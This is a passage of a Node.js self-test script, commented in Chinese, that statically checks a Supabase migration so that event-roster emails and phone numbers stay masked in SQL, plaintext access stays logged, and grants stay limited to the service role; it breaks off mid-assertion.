#!/usr/bin/env node
/**
 * roster-csv-selftest.mjs —— 名單的明文出口與 CSV（0021）的自檢
 *
 * 分兩段，理由與 event-registration-selftest 相同：這支測試在沒有資料庫的機器上
 * 也必須有意義。
 *
 *   [靜態] 讀 supabase/migrations/0021 與幾支 .ts 的原始碼，守的是**設計不變量**：
 *          pii_access_log 的兩條 CHECK 有沒有把 0019 的舊值弄丟、遮罩是不是真的
 *          搬回 SQL 了、export_event_roster 的函式體裡 pii_log_access 有沒有排在
 *          取值的 select 之前、「誰在簽到表上」是不是只定義了一次。
 *          **永遠會跑。**
 *
 *          ⚠️ CSV 那一段**直接 import src/lib/csv.ts 與 src/lib/admin/roster-csv.ts**，
 *             所以它驗到的是 production 真正用的那一份，不是一份長得很像的複本。
 *             需要 Node ≥ 22.18（原生 TypeScript type stripping）。CI 用的是 24。
 *
 *   [連線] 對一個真的資料庫呼叫那兩支 security definer 函式，數 pii_access_log
 *          的增量，並且試著竄改它。每一次 q() 都是一個獨立的 psql 子行程。
 *
 * ── 為什麼連線段跑本機 PostgreSQL，不是 Management API ──────────────────
 * 這台機器上沒有 SUPABASE_ACCESS_TOKEN，而且**正式庫連 0019 與 0020 都還沒套用**。
 * 這一支要驗的東西（log 恰好 +1、trigger 擋得住 delete）不需要正式庫，只需要一個
 * 真的 PostgreSQL。psql 每呼叫一次就是一條新連線，不需要任何憑證，也不會碰到
 * 正式庫。
 *
 * ⚠️ **這支測試永遠不碰正式庫。** 它只認 ROSTER_SELFTEST_PG_URL，而那個變數要
 *    自己設；沒設就整段 skip（會印出來，不會靜悄悄消失）。
 *
 * 準備一個可以跑的本機庫（PostgreSQL 14+ 即可，實測 18.3）：
 *
 *     createdb ib_p2_test
 *     ROSTER_SELFTEST_PG_URL=postgres:///ib_p2_test \
 *     ROSTER_SELFTEST_APPLY=1 node scripts/roster-csv-selftest.mjs
 *
 * `ROSTER_SELFTEST_APPLY=1` 會先把 0001–0021 套上去（0008 需要 pg_net / vault /
 * pg_cron，本機沒有，會被跳過）。套過一次之後就不用再帶這個變數。
 *
 * 環境變數：
 *   ROSTER_SELFTEST_PG_URL   本機測試庫的連線字串（連線段的開關）
 *   ROSTER_SELFTEST_APPLY    設成 1 時先套用 0001–0021
 */

import { readFileSync, existsSync, readdirSync, statSync } from "node:fs";
import { execFile } from "node:child_process";
import { fileURLToPath, pathToFileURL } from "node:url";
import { dirname, join, relative } from "node:path";
import { promisify } from "node:util";
import {
  assertLedgerMatchesDisk,
  assertLedgerDeclarationsHonest,
  assertMigrationDependencies,
  readMigrationFiles,
} from "./lib/migration-ledger.mjs";

const execFileAsync = promisify(execFile);

const ROOT = join(dirname(fileURLToPath(import.meta.url)), "..");
const SELF = "scripts/roster-csv-selftest.mjs";

const MIG_DIR = join(ROOT, "supabase/migrations");
const MIG_0021 = join(MIG_DIR, "0021_roster_pii.sql");
const MIG_0019 = join(MIG_DIR, "0019_vendors_pii_portal.sql");

// -----------------------------------------------------------------------------
// 迷你測試框架（與 event-registration-selftest 同一套）
// -----------------------------------------------------------------------------

let pass = 0;
let fail = 0;
const skipped = [];

const red = (s) => `\x1b[31m${s}\x1b[0m`;
const green = (s) => `\x1b[32m${s}\x1b[0m`;
const yellow = (s) => `\x1b[33m${s}\x1b[0m`;

function check(label, actual, expected, hint) {
  const ok = JSON.stringify(actual) === JSON.stringify(expected);
  if (ok) {
    pass += 1;
    console.log(green(`  ✓ ${label}`));
  } else {
    fail += 1;
    console.log(red(`  ✗ ${label}`));
    console.log(red(`      預期 ${JSON.stringify(expected)}，實際 ${JSON.stringify(actual)}`));
    if (hint) console.log(red(`      ${hint}`));
  }
}

function checkTrue(label, value, hint) {
  check(label, value === true, true, hint);
}

/**
 * 讀原始碼。**檔案不存在 = 丟例外**，不是回空字串。
 *
 * 這裡曾經是 `existsSync(p) ? readFileSync(p, "utf8") : ""`。問題在於這一支底下大量
 * 的斷言長成 `check("…沒有 X", src.includes("X"), false)` —— 路徑一打錯（或檔案被改名、
 * 搬走），`"".includes("X")` 就是 `false`，那條斷言**靜默通過**，從此永遠是綠的，而且
 * 再也沒有在檢查任何東西。正面斷言會轉紅所以是安全的；只有否定斷言會這樣壞掉。
 * 見 run-selftests.mjs 的「守門 4」。
 */
const readFile = (p) => {
  if (!existsSync(p)) {
    throw new Error(
      `selftest 讀不到檔案：${p}` +
        "（路徑打錯，或檔案被改名／搬走了。這裡刻意不回空字串 —— 回空字串會讓所有" +
        "「確認原始碼裡沒有 X」的否定斷言靜默通過。）",
    );
  }
  return readFileSync(p, "utf8");
};

// 守著 readFile() 自己：路徑打錯時它必須炸掉，而不是回空字串讓否定斷言靜默通過。
{
  const ghost = join(ROOT, "__selftest-missing-file-probe__");
  let thrown = null;
  try {
    readFile(ghost);
  } catch (e) {
    thrown = e;
  }
  checkTrue(
    "🔴 readFile() 讀不到檔案時丟例外，訊息指出是哪個路徑（不是靜默回空字串）",
    thrown !== null && String(thrown.message).includes(ghost),
  );
}

/** 把 SQL 註解拿掉，只留下真的會被執行的部分。 */
function stripComments(sql) {
  let out = "";
  let i = 0;
  while (i < sql.length) {
    if (sql.startsWith("--", i)) {
      const nl = sql.indexOf("\n", i);
      i = nl === -1 ? sql.length : nl;
      continue;
    }
    out += sql[i];
    i += 1;
  }
  return out;
}

/** 把 TS/JS 的註解拿掉。與 event-registration-selftest 的同名函式一致。 */
function stripTs(src) {
  return src
    .replace(/\/\*[\s\S]*?\*\//g, "")
    .split("\n")
    .map((line) => line.replace(/(^|[^:])\/\/.*$/, "$1"))
    .join("\n");
}

/** 抓出某個 view 的定義（到它的 comment on view 為止）。 */
function viewBody(sql, name) {
  const start = sql.indexOf(`create or replace view ${name}`);
  if (start < 0) return "";
  const end = sql.indexOf(`comment on view ${name}`, start);
  return end < 0 ? sql.slice(start) : sql.slice(start, end);
}

/** src/ 底下所有 .ts / .tsx。 */
function walkSrc(dir = join(ROOT, "src"), acc = []) {
  if (!existsSync(dir)) return acc;
  for (const name of readdirSync(dir)) {
    const p = join(dir, name);
    if (statSync(p).isDirectory()) walkSrc(p, acc);
    else if (/\.tsx?$/.test(p)) acc.push(p);
  }
  return acc;
}

console.log("═══ 名單 PII 與 CSV 自檢（0021）═══");

// =============================================================================
// [1] migration 檔案盤點
// =============================================================================
console.log("\n[1] migration 檔案盤點");

check("0021 存在", existsSync(MIG_0021), true);

// ⚠️ 這裡曾經是 `existsSync(MIG_DIR) ? readdirSync(…) : []`。那是「讀不到就回空字串」
//    的陣列版：MIG_DIR 一打錯，migrations 就是 []，底下每一條「掃全部 migration，
//    有違規就紅」的斷言都跑 0 次迴圈、靜默通過。readMigrationFiles() 讀不到目錄、
//    或掃不到任何 .sql，一律丟例外。（同 run-selftests.mjs 的「守門 4」，只是那一條
//    掃的是 readFileSync，掃不到 readdirSync 的這一版。）
const migrations = readMigrationFiles(MIG_DIR);
// ⚠️ 0022（交易信 outbox 與付款通知）加進來時，這兩條把人叫回來了。逐條重讀過，
//    0021 的三個核心不變量在 0022 之後仍然成立：
//
//    1. **遮罩仍然做在 SQL。** 0022 沒有重新定義 admin_event_roster，也沒有加
//       第三支會回傳明文的函式。它取信箱的那一句在 enqueue_registration_emails()
//       的 insert…select 裡，值直接落進 email_outbox.to_email —— 明文一步都沒有
//       離開資料庫，所以「回傳明文的出口只有兩個」原樣成立。
//    2. **pii_access_log 一個字都沒被碰。** 那是刻意的（0022 §0.5）：寄信不是
//       「有人在查資料」，每寄一封就寫一列會讓那張表失去唯一的用途。所以 §2 的
//       每一條 CHECK 斷言、§5/§6 的「先寫 log 再組值」全部不受影響。
//    3. **on_roster 仍然是唯一的名單定義。** 0022 的 enqueue_registration_emails()
//       自己 `join public.admin_event_roster ... where v.on_roster`，沒有第二份
//       `payment_status = 'paid'`。下面 [7] 那條「整個 src/ 裡碰名單的檔案都不准
//       出現 "paid" 字面值」的掃描因此照樣有效，而且 0022 期新增的
//       src/server/notify.ts 也在它的掃描範圍裡（notify-selftest [13] 再守一次）。
//
//    0022 自己的內容由 scripts/notify-selftest.mjs 驗。
// 0024_blackcat_payment.sql（黑貓 PAY 線上刷卡：orders.payment_url /
// payments.gateway_trans_id / payment_alerts()）是這一期加的。
// 0025_event_speaker.sql（活動掛講者：public.events.speaker_id -> public.artists.id）
// 是這一期加的。它只在 public.events 上加一欄與一個索引，沒有碰這一支在驗的任何
// 東西。0025 自己的內容由 artists-selftest 驗。
// 0026_event_product_link.sql（活動與商品的真連結）是這一期加的。它加 events.slug /
// events.image_key、products 對活動來源的唯一索引，以及 admin_upsert_event_with_session()。
// 它沒有碰 admin_event_roster、event_registrations、on_roster 的定義，也沒有在任何
// 地方寫下第二份 payment_status = 'paid' —— 下面 [7] 那條掃描因此照樣有效。
// 0026 自己的內容由 event-product-selftest 驗。
// 0027_event_blocks.sql（活動頁組裝器的資料層）是這一期加的。它加 events 的七個
// jsonb 清單欄位、public.event_blocks、admin_reorder_event_blocks()，並用
// create or replace 讓 admin_upsert_event_with_session() 多吃那七欄。整支檔案裡
// admin_event_roster / event_registrations / on_roster / payment_status 各出現 0 次，
// 也沒有在任何地方寫下第二份 payment_status = 'paid' —— 下面 [7] 那條掃描因此照樣有效。
// 0027 自己的內容由 event-blocks-selftest 驗。
// ── 從這一期起，逐支點名搬到共用帳本 ─────────────────────────────────────
// 上面那幾段散文是 0022–0027 進來時逐條重讀的結論，保留下來當紀錄。但**新的
// migration 不要再往上面加一段散文** —— 註解沒有任何東西在驗。改成到
// scripts/lib/migration-ledger.mjs 的 MIGRATION_LEDGER 補一列，寫下它動了哪些
// 區域；少標會被 assertLedgerDeclarationsHonest() 拿 SQL 打臉，標對了會由
// assertMigrationDependencies() 自動把這支自檢叫回來。
//
// 這裡原本是 `check("migrations 共 27 支", migrations.length, 27)`。
// assertLedgerMatchesDisk() 取代它，而且比它強：比對完整的有序檔名清單，
// 不只是數量。
assertLedgerMatchesDisk(check, MIG_DIR);
assertLedgerDeclarationsHonest(check, MIG_DIR);
check("0021 仍在原位", migrations[20], "0021_roster_pii.sql");
// 🔴 這一條原本的標籤寫著「0023 是最後一支」，但它斷言的是
//    `migrations[22] === "0023_fix_cron_guard.sql"` —— 也就是「0023 在第 23 個
//    位置」。0024 進來之後 0023 還是在第 23 個位置，所以這條**不會轉紅**，而
//    測試輸出會印出綠色的「✓ 0023 是最後一支」，此時真正的最後一支是 0027。
//    斷言本身是好的，壞的是標籤。「最新的一支是誰」由 event-blocks-selftest [1]
//    守著；「編號連續」由上面的 assertLedgerMatchesDisk() 守著。
check("0023 仍在第 23 個位置（沒有被改號或插隊）", migrations[22], "0023_fix_cron_guard.sql");
// ── 這支自檢依賴哪幾個區域，以及它審到哪一支 ─────────────────────────────
// 這支守的是 0021 的三個核心不變量：遮罩做在 SQL（roster_pii）、pii_access_log
// 是唯一的明文留痕（roster_pii）、on_roster 是唯一的名單定義
// （roster_pii + event_registrations）。它也依賴 event_registrations 那張表的
// 形狀，以及 admin_event_roster 讀的 event_sessions 欄位（session_seats）。
assertMigrationDependencies(check, MIG_DIR, {
  suite: "roster-csv-selftest",
  dependsOn: [
    "roster_pii",
    "event_registrations",
    "session_seats",
    "orders_payments",
    "order_expiry",
    "inventory",
    "admin_auth",
  ],
  // ── 0028_free_order_settlement.sql 的重讀結論 ─────────────────────────────
  // 0028 讓 total = 0 的訂單在結帳當下就結清（settle_free_order()：status='processing'
  // / payment_status='paid' / payment_method='free' / paid_at=now()），並給
  // invoice_backlog() 加上 total > 0。它**沒有**重寫 expire_unpaid_orders()，也沒有
  // ALTER 任何一張表 —— 唯一的 DDL 是 orders_payment_method_check 的 drop + add
  // （多一個允許值 'free'，既有四個原樣保留；那正是 0024 檔頭寫下的規定做法）。
  // 逐條重讀之後：0021 §3 的 admin_event_roster 與 on_roster 定義沒被 0028 碰到；免費訂單變成 paid 之後 on_roster 會是 true，那正是「免費報名的人本來就該在簽到表上」。「任何提到 event_registrations 的檔案不可以出現 \"paid\" 字面值」那一條也重新驗過：我改的 src/server/repos/orders.ts 剝掉註解之後不含 event_registrations，所以不在那條規則的掃描範圍內，而且沒有新增任何 \"paid\" 字面值。原樣成立。
  // ── 0029_event_seats_visibility.sql 的重讀結論 ───────────────────────────
  // 0029 讓「尚餘名額 N」變成逐場活動可以關掉：public.events 與 public.products 各加
  // 一個 show_seats_remaining（boolean not null default true ＝ 維持既有行為），加兩個
  // trigger 讓兩邊不分岔（events→products 推、products 寫入時反向拉），並用
  // create or replace 讓 admin_upsert_event_with_session() 多讀一個 payload key。
  // **沒有 ALTER 任何一張既有欄位、沒有 drop 任何函式、沒有動到任何一支 RPC 的邏輯**
  // ——那支函式的本體是 0027 那一份逐字照抄，只多了三處 show_seats_remaining
  // （0029 §5 寫了差異清單，scripts/event-blocks-selftest.mjs [7] 現在改成驗
  //   **最後一支重新定義它的 migration**，所以那份抄寫走樣會轉紅）。
  // 逐條重讀之後：0021 的 admin_event_roster、on_roster、pii_access_log 與那兩個會留痕
  // 的明文出口，0029 一個字都沒提到。show_seats_remaining 是店家對「畫面上印不印一個
  // 數字」的決定，跟名單、遮罩、個資出口沒有交集；它也沒有新增任何 grant。原樣成立。
  // ── 0030_customer_accounts.sql 的重讀結論 ────────────────────────────────
  // 0030 加客人帳號的資料層：一支新函式 claim_guest_orders(uuid)（security definer、
  // 只 grant execute 給 service_role），把 customer_email 對得上、而且 user_id 仍是
  // null 的訪客訂單指給註冊並驗證過信箱的帳號；外加一支 partial index。
  // **沒有 ALTER 任何一張表、沒有 create or replace 任何既有函式、沒有動任何 CHECK／
  // trigger／排程，也沒有開任何 RLS policy 或對 anon / authenticated 的 grant**。
  // 它唯一寫到的欄位是 public.orders.user_id（0005:65 就存在，到 0029 為止沒有任何
  // 程式碼讀或寫過它）。
  // 逐條重讀之後：0021 的 admin_event_roster、on_roster、pii_access_log 與那兩個會
  // 留痕的明文出口，0030 一個字都沒提到。
  // ⚠️ 但**這一期真的多了一個檔案落進下面 [n] 那條掃描的範圍**：
  //    src/server/repos/customer-orders.ts 提到 event_registrations（客人看自己買到的
  //    位子）。那條規則因此會自動掃到它，而它沒有 "paid" 字面值 —— 它讀的是 orders
  //    的 payment_status **欄位名**，不是 'paid' 這個**值**，判斷付款狀態這件事整支
  //    檔案都沒有做。這正是那條規則想要的結果，不需要例外。
  //    （那一支也沒有 insert / update / delete，只讀。）
  // 原樣成立。
  // ── 0031_event_gallery.sql 的重讀結論 ─────────────────────────────────────
  // 0031 加活動相簿（events.gallery_keys text[]），並放寬
  // admin_upsert_event_with_session() 對 external_url 的「不可為空」驗證。函式
  // 本體是 0029 那一份逐字照抄，新寫的程式碼只在 events 那一段（insert 欄位
  // 清單、驗證迴圈、一段陣列型別轉換）；products 與 event_sessions 兩段、
  // 0021 的 admin_event_roster、on_roster、pii_access_log 與那兩個會留痕的
  // 明文出口，0031 一個字都沒提到，也沒有新增任何檔案落進「event_registrations
  // 不可以出現 paid 字面值」那條規則的掃描範圍——這一期沒有新增或修改任何一支
  // TypeScript 檔案提到 event_registrations。原樣成立。
  // ── 0032_admin_order_notify.sql 的重讀結論 ─────────────────────────────────
  // 0032 加店家的新訂單／新報名通知：site_settings.notify_emails ＋
  // enqueue_admin_order_email()，把摘要信排進既有的 email_outbox。它的 SQL 本體
  // 完全沒有碰 0021 的 admin_event_roster / on_roster / pii_access_log，也沒有
  // 動 event_registrations 或 event_sessions 的任何一欄。帳本標 orders_payments
  // 是語意上的：enqueue_admin_order_email() 只查 site_settings，真正讀
  // public.orders 的是既有的 getOrderForNotify()，0032 只多加 payment_method /
  // shipping_method 兩個既有欄位，沒有碰 payment_status——on_roster 那條
  // `(o.payment_status = 'paid') as on_roster` 的定義（0021 §3）原樣沒動。
  // ⚠️ 這一期新增或修改的六支檔案裡（git show 1fd71b4 --stat：
  //    email-templates.ts / _shell.settings.tsx / server/email.ts /
  //    server/notify.ts / repos/email-outbox.ts / repos/site-settings.ts），
  //    有兩支落進下面 [7] 那條「整個 src/ 裡碰 event_registrations /
  //    admin_event_roster 的檔案都不准自己寫一次 'paid'」的掃描範圍——
  //    server/email.ts（檔頭一段散文提到 event_registrations 當範例）與
  //    repos/email-outbox.ts（三處註解提到 event_registrations / 0022 §7 的
  //    join 慣例）。逐一確認過這兩支剝掉註解之後都沒有 "paid" 或 'paid' 這個
  //    字面值——它們判斷「該不該寄」用的是 claim_order_notify() 的 claim 結果與
  //    dedupe_key，不是自己重新判斷一次付款狀態。其餘四支（email-templates.ts /
  //    _shell.settings.tsx / notify.ts / site-settings.ts）完全不提
  //    event_registrations / admin_event_roster，不落在掃描範圍內。原樣成立。
  // ── 0033_admin_staff_management.sql 的重讀結論 ────────────────────────────
  // 0033 加後台人員管理頁的資料庫底座：profiles_keep_last_admin（AFTER
  // STATEMENT trigger，擋刪除／降級最後一位 admin）＋ admin_update_profile_role
  // 與 admin_replace_staff_permissions 兩支 RPC（都只 grant 給 service_role）。
  // 命中 admin_auth 純粹是因為它的 SQL 提到 profiles 與 staff_permissions 這兩個
  // 表名——它**沒有**動 0021 §4 幫 staff_permissions.permission 加的 CHECK
  // （九種值域，event.roster.read 仍在裡面，未被 drop/add 過），也沒有動
  // fns/event-registrations.ts 那四支 staffFnMiddleware()、沒有動側欄
  // NAV_GROUPS 既有的「活動報名」項目（0033 只在別處新增一個獨立的後台人員
  // 管理項目）。它新增的 trigger 只在 update／delete profiles 時觸發，
  // event-registrations 那四支 fn 完全不寫 profiles，不受影響。原樣成立。
  // ── 0034_transfer_payment.sql 的重讀結論 ───────────────────────────────────
  // 0034 加匯款付款方式。這支守的是名單的遮罩、明文出口與 PII 存取紀錄。逐條對過：
  //   · roster_pii **不在** 0034 的 touches 裡——它沒有碰 admin_event_roster、
  //     pii_access_log、on_roster 任何一個。這支自檢的核心斷言完全不受影響。
  //   · event_registrations / session_seats / order_expiry / inventory 這四個標籤
  //     **全部來自 expire_unpaid_orders() 函式本體的逐字照抄**（第 3、4、4b、4c 步
  //     分別提到 products、inv.products、stock_reservations、event_registrations、
  //     event_sessions）。0034 在那支函式裡唯一新寫的程式碼是第 1 步 claim 條件裡
  //     的一行 case。名單上有誰、看得到什麼，一個字都沒變。
  //   · orders_payments——payment_method 多一個值、orders 多兩個 remittance_* 欄位。
  //     兩個新欄位都不是個資（一組五位數字與一個時間戳），而且**不在**
  //     admin_event_roster 的 select 清單裡（0034 沒有 create or replace 那個 view）。
  //   · admin_auth——0034 沒有碰 profiles / staff_permissions / is_admin()。
  //     admin_mark_order_paid() 是 security definer + 只 grant service_role，
  //     授權由呼叫端（後台 server function）負責，與這支守的東西無關。
  // 原樣成立。
  // ── 0035_admin_order_registration_cleanup.sql 的重讀結論 ───────────────────
  // 0035 是後台訂單刪除／封存＋名單刪除單筆（新增 src/server/repos/
  // event-registrations-admin.ts、fns/event-registrations.ts 多一支
  // deleteAdminRegistration）。逐一對過這支依賴的七個區域：
  //   · roster_pii **不在** 0035 的 touches 裡——沒有 create or replace
  //     admin_event_roster、沒有碰 pii_access_log、沒有動 on_roster 的定義
  //     （那個定義完全在 0021 §3 的 view 裡，0035 一行都沒改那個 view）。
  //   · event_registrations / session_seats——admin_delete_registration()
  //     （0035 §5）直接 delete public.event_registrations 一列並扣
  //     event_sessions.seats_taken，但它是**新函式**，不是 create or replace
  //     0020／0021 既有的任何一支；reveal_registration_contact() /
  //     export_event_roster() / admin_event_roster 一個字都沒被動到。
  //   · orders_payments / order_expiry——admin_delete_order() 加的欄位與函式，
  //     跟名單的遮罩／明文出口無關；expire_unpaid_orders() 沒被重寫。
  //   · inventory——admin_delete_order() 的 has_inventory_sale 檢查查 inv.sales，
  //     跟 roster-csv 這支守的 inv.mask_email() 是同一個 schema 裡完全不相干
  //     的兩支函式，inv.mask_email() 一個字沒被 0035 動到。
  //   · admin_auth——0035 沒有碰 profiles / staff_permissions / is_admin()。
  //     三支新函式的授權在 TS 那一層的 adminFnMiddleware 做，SQL 本體完全沒有
  //     查 profiles 或 staff_permissions（p_actor_id 只是原樣存進 raise log）。
  //
  // ⚠️ 這一期新增或修改的兩支檔案落進 [7] 那條「碰 event_registrations 的檔案
  //    不准自己寫一次 'paid'」的掃描範圍：src/lib/admin/fns/event-registrations.ts
  //    （多了 deleteAdminRegistration，import 路徑字串含 event-registrations）。
  //    確認過它剝掉註解之後沒有 "paid" 或 'paid' 這個字面值——新函式完全不判斷
  //    付款狀態（已付款的報名也允許刪，是 user 的決定，見它的檔頭說明），根本
  //    不需要讀 payment_status。新建的
  //    src/server/repos/event-registrations-admin.ts 提到 event_registrations
  //    的地方全部在會被 stripTs() 剝掉的註解裡，程式碼本體一次都沒有寫這個表名
  //    字面值（只呼叫 RPC），所以**不會**落進這條掃描的範圍——[7] 段的
  //    rosterTouchers 清單因此沒有變長。原樣成立（實跑驗證見交付回報）。
  // 0040_referral_program.sql（推薦碼與分潤）對 orders 只做了三件事：加三個 nullable
  // 欄位 referrer_id／referral_code／referral_discount_percent（舊訂單全是 NULL）、
  // 一個部分索引、一個指向新表 referrers 的 FK（on delete restrict，限制的是刪推廣者，
  // 不是刪訂單）。既有欄位、CHECK、函式、policy、grant 一個字都沒改。唯一的語意變化
  // 是 orders.discount 從恆為 0 變成「推薦折扣」（只對選品／書籍、最多 50%），而
  // total = subtotal + shipping_fee − discount 仍是金流、信件、發票唯一使用的金額
  // （發票本來就把 discount 開成負數列）。這支自檢的斷言重讀過，原樣成立。
  // 0044（移除報名補票種＋稽核）：admin_delete_registration() 簽章與回傳形狀不變，只多讀
  // order_items.plan_id、場次先票種後加鎖、退 event_session_plans.units_taken、改用
  // DELETE…RETURNING（沒刪到就不扣 seats_taken）、寫一列新表 registration_removal_log；
  // 另外校正一個票種的 units_taken。不改 order_items／event_registrations／event_sessions
  // 的欄位、約束、trigger 或其他函式，不碰訂單、付款、發票、交易信。這支自檢的斷言重讀過，原樣成立。
  // 0045（票種改依實際刪掉的報名列數退）：create or replace 了 release_session_seat() 與
  // expire_unpaid_orders()，簽章、回傳形狀、security definer、grant 都不變。唯一的行為差異是
  // event_session_plans.units_taken 退 ceil(實際刪掉列數/spu) 而不是 order_items.quantity（沒人
  // 被單筆移除過時兩者相等）；expire 的 4c／4d 合成一句，認領條件（含 0034 匯款 3 天）、商品
  // 庫存、products.seats_taken、inv 保留、取消訂單、付款嘗試、回傳值逐字沿用 0036。另 revoke
  // registration_removal_log 的 sequence 權限。這支自檢的斷言重讀過，原樣成立。
  // 0047（後台作廢發票）：invoices 只加三個 nullable 欄位與 CHECK，新增 claim／finish／release_invoice_void
  // 三支函式；public.orders 只被 claim 唯讀 select order_no／total。0007 的開立函式、invoice_backlog、
  // orders／payments 的欄位、約束、grant 一個都沒動。這支自檢的斷言重讀過，原樣成立。
  reviewedThrough: "0047_invoice_void.sql",
});
// 這一期不准動到既有的 0001–0020，所以它們也必須都還在。
for (let n = 1; n <= 20; n += 1) {
  const prefix = String(n).padStart(4, "0");
  check(
    `migration ${prefix} 仍在`,
    migrations.some((f) => f.startsWith(`${prefix}_`)),
    true,
  );
}

const sql0021 = readFile(MIG_0021);
const exec0021 = stripComments(sql0021);
const exec0019 = stripComments(readFile(MIG_0019));

// 反空殼：先證明檔案真的有內容，否則下面每一條 includes() 都是假性結果。
checkTrue(
  "反空殼：0021 不是空檔（> 8000 字）",
  exec0021.length > 8000,
  `實際 ${exec0021.length} 字`,
);
checkTrue("0021 有 begin; … commit;", /^begin;/m.test(exec0021) && /^commit;/m.test(exec0021));
checkTrue("反空殼：0019 也讀得到（下面要跟它比對）", exec0019.length > 15000);

// =============================================================================
// [2] pii_access_log 的兩條 CHECK：放寬，不是重寫
// =============================================================================
console.log("\n[2] pii_access_log 的 CHECK 放寬得安全");

// drop constraint + add constraint（0019 §3.7 放寬 0010 用的是同一個手法）。
checkTrue(
  "subject_table 用 drop constraint + add constraint",
  /drop constraint if exists pii_access_log_subject_table_check/.test(exec0021) &&
    /add constraint\s+pii_access_log_subject_table_check/.test(exec0021),
);
checkTrue(
  "reason 用 drop constraint + add constraint",
  /drop constraint if exists pii_access_log_reason_check/.test(exec0021) &&
    /add constraint\s+pii_access_log_reason_check/.test(exec0021),
);

// 0019 的舊值一個都不能掉：正式庫上已經有那些值的列，掉一個 add constraint 就失敗。
for (const t of ["inv.vendors", "inv.vendor_bank_accounts"]) {
  checkTrue(`subject_table 保留 0019 的 '${t}'`, exec0021.includes(`'${t}'`));
}
for (const r of ["reconciliation", "payment", "tax_filing", "vendor_enquiry", "self_service"]) {
  checkTrue(`reason 保留 0019 的 '${r}'`, exec0021.includes(`'${r}'`));
}
// 這一期新增的四個值。
for (const t of ["public.event_registrations", "public.event_sessions"]) {
  checkTrue(`subject_table 新增 '${t}'`, exec0021.includes(`'${t}'`));
}
for (const r of ["attendee_contact", "roster_export"]) {
  checkTrue(`reason 新增 '${r}'`, exec0021.includes(`'${r}'`));
}
// subject_table 一律帶 schema 前綴 —— 少了它就分不出 inv.products 與 public.products。
checkTrue(
  "新增的 subject_table 都帶 schema 前綴",
  !/'event_registrations'/.test(exec0021) && !/'event_sessions'/.test(exec0021),
);

// ⚠️ **不可以動 pii_log_access 的簽名。** 0019 §1.4 那三行 revoke/grant 是照著
//    (uuid, text, text, uuid, text, text[], text, text) 寫的；改簽名就得先 drop，
//    而 drop 之後 0019 重跑會指向一個不存在的東西。
checkTrue(
  "0021 沒有 drop function pii_log_access",
  !/drop\s+function[^;]*pii_log_access/i.test(exec0021),
);
checkTrue(
  "0021 沒有重新定義 pii_log_access",
  !/create\s+or\s+replace\s+function\s+public\.pii_log_access/i.test(exec0021),
);
// 兩支新函式都是「呼叫」它，不是繞過它。
checkTrue("0021 的新函式呼叫 pii_log_access", /public\.pii_log_access\(/.test(exec0021));
// ⚠️ 也不可以把 §1.3 的兩道門拆掉。
checkTrue(
  "0021 沒有碰不可竄改的 trigger",
  !/drop\s+trigger[^;]*pii_access_log_immutable/i.test(exec0021),
);
checkTrue(
  "0021 沒有直接 insert into pii_access_log",
  !/insert\s+into\s+public\.pii_access_log/i.test(exec0021),
);
checkTrue(
  "0021 沒有把 pii_access_log 的表層權限發回去",
  !/grant[^;]*\son\s+table\s+public\.pii_access_log/i.test(exec0021),
);

// =============================================================================
// [3] 遮罩搬回 SQL
// =============================================================================
console.log("\n[3] 遮罩在資料庫，不在應用層");

checkTrue(
  "0021 建了 inv.mask_email()",
  /create or replace function inv\.mask_email\(p_value text\)/.test(exec0021),
);
checkTrue("mask_email 內部用 inv.mask_tail（一套規則不是兩套）", /inv\.mask_tail\(/.test(exec0021));
checkTrue(
  "mask_email 是 immutable（view 才進得了索引與計畫快取）",
  /create or replace function inv\.mask_email[\s\S]{0,200}?immutable/.test(exec0021),
);
checkTrue(
  "0021 沒有覆寫 inv.mask_tail（0019 的那一支不動）",
  !/create or replace function inv\.mask_tail/.test(exec0021),
);
checkTrue(
  "mask_email 先 revoke 再 grant",
  /revoke execute on function inv\.mask_email\(text\) from public/.test(exec0021) &&
    /revoke execute on function inv\.mask_email\(text\) from anon, authenticated/.test(exec0021) &&
    /grant\s+execute on function inv\.mask_email\(text\) to service_role/.test(exec0021),
);

// =============================================================================
// [4] public.admin_event_roster —— 遮罩過，而且送不出明文
// =============================================================================
console.log("\n[4] 名單 view");

const rosterView = viewBody(exec0021, "public.admin_event_roster");
checkTrue(
  "反空殼：切得出 admin_event_roster 的定義",
  rosterView.length > 500,
  `實際 ${rosterView.length} 字`,
);
checkTrue(
  "security_invoker = false（比照 inv_admin_vendor_list）",
  /create or replace view public\.admin_event_roster\s*\n?\s*with \(security_invoker = false\)/.test(
    exec0021,
  ),
);
checkTrue(
  "view 用 inv.mask_email 遮信箱",
  /inv\.mask_email\(r\.email\)\s+as email_masked/.test(rosterView),
);
checkTrue(
  "view 用 inv.mask_tail 遮電話（留後 4 碼）",
  /inv\.mask_tail\(r\.phone, 4\)\s+as phone_masked/.test(rosterView),
);
// 姓名不遮罩 —— 遮了現場點不了名（與 0019 讓廠商名稱明文是同一條線）。
checkTrue("姓名是明文（點名要用）", /r\.name\s+as name/.test(rosterView));
// ⚠️ 這是這個 view 最重要的一條：**select list 裡不可以有裸的 email / phone**。
check(
  "view 沒有送出裸的 email",
  /(^|[^_])\br\.email\s+as\s+email\b/.test(rosterView) || /\bas\s+email\b/.test(rosterView),
  false,
);
check(
  "view 沒有送出裸的 phone",
  /(^|[^_])\br\.phone\s+as\s+phone\b/.test(rosterView) || /\bas\s+phone\b/.test(rosterView),
  false,
);
// 「有沒有填」與「填了什麼」是兩件事（同 0019 §3.1 的 has_tax_id）。
checkTrue(
  "view 有 has_email / has_phone",
  /has_email/.test(rosterView) && /has_phone/.test(rosterView),
);
checkTrue(
  "view 只給 service_role",
  /revoke all\s+on public\.admin_event_roster from anon, authenticated/.test(exec0021) &&
    /grant\s+select on public\.admin_event_roster to service_role/.test(exec0021),
);
check(
  "view 沒有 grant 給 anon 或 authenticated",
  /grant[^;]*on public\.admin_event_roster to[^;]*(anon|authenticated)/.test(exec0021),
  false,
);

// =============================================================================
// [5] 「誰在簽到表上」只定義一次
// =============================================================================
console.log("\n[5] on_roster 是唯一的定義");

checkTrue("view 算出 on_roster", /\(o\.payment_status = 'paid'\)\s+as on_roster/.test(rosterView));
// ⚠️ 這是這一支測試存在的核心理由。快樂手用註解要求「簽到表與提醒信兩邊條件一致」，
//    而註解防不住下一個人。這裡讓那個條件在整支 migration 裡只出現一次。
const paidLiterals = (exec0021.match(/'paid'/g) ?? []).length;
check("整支 0021 裡 'paid' 這個字面值只出現一次", paidLiterals, 1, "多一次就是多一個會寫錯的地方");
checkTrue(
  "export_event_roster 用 on_roster 過濾，不是自己寫一次 payment_status",
